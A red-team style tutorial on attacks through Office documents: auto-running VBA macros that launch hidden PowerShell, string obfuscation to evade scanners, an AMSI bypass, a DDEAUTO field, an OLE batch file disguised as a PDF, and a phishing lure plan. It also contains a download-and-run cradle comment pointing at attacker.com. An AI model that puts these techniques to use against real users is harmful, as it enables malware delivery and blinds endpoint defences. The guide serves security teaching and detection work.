# 🛡️ A Guide to Office Document Attack Vectors

<br>

## 📚 Table of Contents

| Section | Summary | Subsections |
|---|---|---|
| **1️⃣ Introduction** | Why Office docs remain a top attack vector | The Enduring Threat of Malicious Documents |
| **2️⃣ Lab Setup** | Safe, repeatable VM lab & tooling | Creating a Safe Environment |
| **3️⃣ VBA Macros** | Macro-based stagers & evasion | First Macro · Payload Stager · Obfuscation · AMSI notes |
| **4️⃣ DDE Exploits** | Legacy "no-macro" field attacks | DDE overview · DDE payload example · Detection |
| **5️⃣ OLE Embedding** | Embedded-object (icon) trojans | OLE overview · Embed recipe · Detection |
| **6️⃣ Attack Flow** | Example: phishing → execution (illustrative) | Lure · Execution · Suggested detection points |
| **7️⃣ Conclusion** | Key takeaways for defenders & testers | Defensive checklist · Red-team notes |
| **8️⃣ Further Reading** | Links to MITRE, tools, blogs | MITRE ATT&CK · oletools · Sysmon · Blogs |

**Scope & Limitations**  
> The "Attack Flow" is **illustrative only**. It's a compact example of how a phishing document can lead to execution and what telemetry to collect. This README is *not* a comprehensive threat model. Use it as a learning baseline.

<br>

## 🔎 Introduction: The Enduring Threat of Malicious Documents

Microsoft Office files (Word, Excel, PowerPoint) are everywhere and that’s exactly why attackers love them. People trust these files, so threat actors hide malicious tricks in features like macros, DDE links, and embedded objects to run code on a victim’s machine. That initial foothold can lead to ransomware, data theft, or corporate espionage.

If you work in security (red, blue, or purple) you can’t ignore this stuff. Knowing how attackers build these documents helps you tune detections, harden systems, and teach users what to watch for.

This guide walks through document-based attacks from first principles to advanced evasion techniques.

<br>

## 🧪 Lab Setup: Creating a Safe Environment

Never perform these tests on a machine you care about. Use a dedicated, isolated virtual environment.

1.  **Virtualization Software:** Use VirtualBox (free) or VMware Workstation/Fusion. 
2.  **Victim Machine:** A Windows 10/11 virtual machine (VM). 
3.  **Software:**  
    *   Install a version of Microsoft Office on the Windows VM. A trial or developer license is sufficient.   
    *   Install security tools you want to test against (e.g., an antivirus, Sysmon for logging). 
4.  **Network Configuration:** Set the VM's network adapter to "Host-only" or "NAT" to isolate it from your primary network. For more advanced tests involving C2 (Command and Control), you may need a more complex setup.

<br>

## 📜 Attack Vector 1: VBA Macros - The Classic Approach

Visual Basic for Applications (VBA) is a powerful scripting language embedded in Office applications. While intended for automation, it can be abused to run system commands, download files, and execute malware. Embedded documents won’t run macros until a user deliberately clicks "Enable Content". That single click is a major social‑engineering barrier, so attackers must trick a human into taking that action.

<br>

### Step 1: Your First Macro

Let's start by understanding the mechanism with a harmless "Hello, World" macro.

1.  Open Microsoft Word and create a blank document.  
2.  Go to the **View** tab and click **Macros**.  
3.  Type a name for the macro (e.g., `MyTest`) and click **Create**. This will open the VBA editor.  
4.  Inside the `Sub MyTest()` block, enter the following code:

```vb
Sub MyTest()
    ' This is a simple message box to demonstrate macro execution.
    MsgBox "This macro executed successfully!", vbInformation, "Test"
End Sub
```

5.  To make the macro run automatically when the document is opened, we use a special subroutine called `AutoOpen`:

```vb
Sub AutoOpen()
    ' This code will automatically run when the document is opened and macros are enabled.
    MsgBox "Document opened and macro ran!", vbExclamation, "Auto-Execution"
End Sub
```

6.  Save the document. You **must** save it as a **Word Macro-Enabled Document (.docm)**. 
7.  Close and reopen the document. You will see a yellow security warning bar: "SECURITY WARNING Macros have been disabled." Click **Enable Content**. The message box will appear.

<br>

### Step 2: Creating a Payload Stager

A "stager" is a small piece of code whose job is to download and execute a larger, more complex piece of malware (the "payload"). This keeps the initial document size small and makes it harder to detect.

Here, we'll create a macro that uses PowerShell to launch the Windows Calculator (`calc.exe`). In a real attack, `calc.exe` would be replaced with a command to download and run a malicious script or binary.

```vb
Sub AutoOpen()
    ' This subroutine executes a command using the WScript.Shell object.
    ' It's less conspicuous than other methods and is a common technique.
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' The command to be executed. In a real attack, this would be a malicious PowerShell command.
    ' For this educational example, we are safely launching the calculator.
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""Start-Process calc.exe"""
    
    ' Run the command. The second argument (0) hides the command window.
    shell.Run cmd, 0
    
    ' Optional: Display a benign message to the user to reduce suspicion.
    MsgBox "The document has been successfully updated.", vbInformation, "Success"
    
    ' Optional: Self-destruct the macro to hinder analysis after execution.
    ' Application.VBE.ActiveVBProject.VBComponents.Remove Application.VBE.ActiveVBProject.VBComponents("ThisDocument")
End Sub
```

**Explanation:**

*   `CreateObject("WScript.Shell")`: This creates an object that can interact with the Windows shell, allowing us to run commands.
*   `powershell.exe`: We use PowerShell because it's powerful and installed on all modern Windows systems. 
*   `-WindowStyle Hidden`: Ensures the user doesn't see a flashing PowerShell window. 
*   `shell.Run cmd, 0`: Executes the command. The `0` makes the window invisible. 

<br>

### Step 3: Evasion Technique - String Obfuscation 

Antivirus software and security analysts scan files for suspicious strings like `"powershell.exe"`, `"WScript.Shell"`, and `"DownloadString"`. We can evade this simple static analysis by breaking up and hiding these strings.

Let's obfuscate the command from Step 2.

```vb
Sub AutoOpen()
    Dim shell As Object
    ' Obfuscate the object creation string.
    Set shell = CreateObject("WSc" & "ript.S" & "hell")
    
    Dim cmdPart1 As String
    Dim cmdPart2 As String
    Dim cmdPart3 As String
    
    ' Break the command into multiple parts using concatenation.
    ' Chr() is used to represent characters by their ASCII code, further hiding strings.
    cmdPart1 = "powershell" & ".exe" & " -WindowStyle Hidden -NoProfile -Exec"
    cmdPart2 = "utionPolicy Bypass -Command "
    cmdPart3 = Chr(34) & "Start-Process " & "c" & "a" & "l" & "c" & ".exe" & Chr(34)
    
    Dim fullCmd As String
    fullCmd = cmdPart1 & cmdPart2 & cmdPart3
    
    shell.Run fullCmd, 0
End Sub
```

**Note** 
> This code does the exact same thing as the previous example, but it's much harder for a simple pattern-matching scanner to flag as malicious.

<br>

### Step 4: Evasion Technique - Bypassing AMSI ️

The **Antimalware Scan Interface (AMSI)** is a modern Windows defense mechanism. It allows applications (like PowerShell) to send scripts and commands to the installed antivirus product for inspection *at runtime*, just before they are executed. This defeats most forms of file-based obfuscation.

Attackers have found various ways to "patch" AMSI in memory for their process, effectively blinding it. One of the most famous (and now widely detected, but great for learning) bypasses involves forcing an error in the AMSI initialization.

Here is how an attacker might integrate a known AMSI bypass into a VBA macro.

```vb
Sub AutoOpen()
    Dim cmd As String
    
    ' This is a well-known PowerShell AMSI bypass.
    ' It works by finding the AmsiUtils class and setting the 'amsiInitFailed' field to 'true'.
    ' This tricks the system into thinking AMSI failed to start, so it doesn't scan subsequent commands.
    ' NOTE: Many modern AV/EDR solutions specifically detect this signature.
    Dim amsiBypass As String
    amsiBypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    
    ' The actual malicious payload.
    Dim payload As String
    payload = "Start-Process calc.exe" ' In a real attack: (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1') | IEX
    
    ' Combine the bypass and the payload into a single command.
    ' The semicolon (;) acts as a command separator in PowerShell.
    cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & amsiBypass & payload & """"
    
    ' Execute the command.
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

**Note** 
> The attack is now layered. The VBA macro is just a launcher for a PowerShell command, which first disables security controls (AMSI) and then executes the real payload.

<br>

## 🔗 Attack Vector 2: DDE Exploits - The "No-Macro" Method

### Understanding DDE

**Dynamic Data Exchange (DDE)** is a legacy feature for inter-process communication, allowing one application to load data from another. For example, a Word document could use DDE to automatically pull a value from an Excel spreadsheet. Attackers found they could abuse this to launch commands. While Microsoft has patched and disabled this by default in modern Office versions, it can still be a threat in older or misconfigured environments. The attack relies on social engineering. The user is presented with several security prompts, which an attacker will try to make look legitimate.

<br>

### Crafting your first DDE Payload 

This attack doesn't use macros at all. The payload is embedded directly into a document *field* and executed when the user accepts the prompts.

1. **Open** a new Word document.  
2. **Insert a field:** press `Ctrl + F9` (you'll see `{ }`).  
3. **Inside the curly braces, type the DDE payload:**  
```text
{ DDEAUTO "C:\\Windows\\System32\\cmd.exe" "/c calc.exe" }
```
   - `DDEAUTO`: instructs Word to auto-launch the DDE link when the document opens.  
   - `"C:\\Windows\\System32\\cmd.exe"`: the program to call (here, `cmd.exe`).  
   - `"/c calc.exe"`: arguments to `cmd.exe`; `/c` runs the command then exits (`calc.exe` is used as a safe demo).

4. **Save** the document.  
5. **Reopen** the document and respond to the prompts:
   - First prompt: “This document contains links to other files.” → **Click Yes** to allow the link.  
   - Second prompt: Word warns that the linked data/application is inaccessible and asks to start it. → **Click Yes** again.

**Note**
> If both prompts are accepted, `calc.exe` will launch. In the real world, an attacker would replace `calc.exe` with a PowerShell download cradle or other stager.

<br>

## 🐴 Attack Vector 3: OLE Object Embedding - The Trojan Horse 

### Understanding OLE

**Object Linking and Embedding (OLE)** allows a user to embed a document or application *inside* another. For example, you can embed an entire Excel spreadsheet within a Word document.

Attackers abuse this by embedding malicious executables or scripts and disguising them as harmless objects, like a PDF or image icon. This attack relies entirely on social engineering to trick the user into double-clicking the embedded object.

<br>

### Crafting an Embedded OLE Object

Create a simple malicious script. For safety, let's create a batch file (`.bat`) that launches the calculator.

1.  Open Notepad, type `calc.exe`, and save it as `payload.bat`. 
2.  Open a new Word document.  
3.  Go to the **Insert** tab > **Object** (in the "Text" group).  
4.  In the Object dialog, select the **Create from File** tab.  
5.  Browse to your `payload.bat` file.  
6.  **Crucially, check the "Display as icon" box.**  
7.  Click **Change Icon**. Here you can choose any icon. To be deceptive, an attacker might browse for `AcroRd32.exe` (Adobe Reader) and select the PDF icon. They would also change the **Caption** to something like `Invoice_Q4.pdf`.   
8.  Click **OK**. You now have an icon in your document that looks like a PDF but is actually your `payload.bat` file.  
9.  Add some text to the document to lure the user, such as "Please double-click the embedded PDF below to view the invoice details." 

**Note**
> When the unsuspecting user double-clicks the icon, they will get a security warning, but if they click **Run**, the batch script will execute, and the calculator will open.

<br>

## 🧩 Putting It All Together: A Simulated Attack Scenario

Let's simulate a Red Team operator's thought process for a spear-phishing campaign.

1.  **Objective:** Gain initial access to a target workstation.

2.  **Vector:** A Word document delivered via email.

3.  **Technique:** VBA Macro with evasion. DDE is too noisy with its prompts, and OLE requires a more user interaction (double-click). A macro behind a single "Enable Content" click is often more effective.

4.  **Execution Plan:**
    *   **Payload:** A PowerShell one-liner that connects back to the attacker's C2 server. For this example, our "payload" is still just `calc.exe`.
    *   **Develop the Macro:**
        *   Use the `AutoOpen()` subroutine.
        *   Obfuscate all strings (`WScript.Shell`, `powershell.exe`, etc.) using concatenation and `Chr()`.
        *   Prepend the command with a known AMSI bypass to blind endpoint security at runtime.
        *   The final command will be executed via `shell.Run "powershell.exe ... [AMSI Bypass]...[Payload]..."`.
    *   **Design the Lure:**
        *   Create a new `.docm` document.
        *   Insert a blurred image or a fake "Protected Document" graphic.
        *   Add text that reads: "This document is protected by company security policy. Please click 'Enable Content' in the yellow bar above to view the document." 
    *   **Delivery:** Embed the document in a convincing phishing email (e.g., subject: "Updated Q4 Financial Report"). 

5.  **Desired Outcome:** The user receives the email, opens the document, sees the lure, clicks "Enable Content," and the macro executes. The PowerShell stager runs, bypasses AMSI, and launches the payload, establishing a foothold for the attacker. 

<br>

## ✅ Conclusion and Key Takeaways 

Office document attacks are a persistent and evolving threat. While the methods change, the core principles remain the same: abusing legitimate features and exploiting human trust.

*   **For Defenders (Blue Team):** Your strategy must be multi-layered. You cannot rely on one single defense.  
    *   **Harden:** Use GPOs and ASR rules to reduce the attack surface.   
    *   **Educate:** Make users your first line of defense. 
    *   **Monitor:** Log process creation and script block execution. Look for anomalies like `winword.exe` spawning `powershell.exe`.  
    *   **Analyze:** Use sandboxed tools to inspect suspicious files before they reach the user. 

*   **For Testers (Red Team):** Your job is to find the gaps in these layers.  
    *   Stay current on new evasion techniques.  
    *   Understand how detection works so you can bypass it. 
    *   Focus on realistic social engineering lures. 

This guide provides the foundational knowledge of *how* these attacks work. The next step is to use this knowledge to test your own environment, find weaknesses, and build a more resilient methods.

<br>

## 🔗 Further Reading and Tools

*   **MITRE ATT&CK Framework:**  
    *   [T1566: Phishing](https://attack.mitre.org/techniques/T1566/)  
    *   [T1204.002: Malicious File (User Execution)](https://attack.mitre.org/techniques/T1204/002/)  
    *   [T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/)  
*   **Essential Tools:**  
    *   [**oletools**](https://github.com/decalage2/oletools): A suite of Python tools for analyzing MS OLE2 files (the foundation of modern Office documents). `olevba` is a must-have.  
    *   [**Sysmon**](https://learn.microsoft.com/sysinternals/downloads/sysmon): A Windows system service that provides detailed logging about process creation, network connections, and file changes. 
*   **Blogs and Research:**  
    *   [Red Canary Blog](https://redcanary.com/blog/): Excellent source for real-world threat intelligence and TTP analysis. 
    *   [The DFIR Report](https://thedfirreport.com/): In-depth reports on real intrusions, often starting with malicious documents.
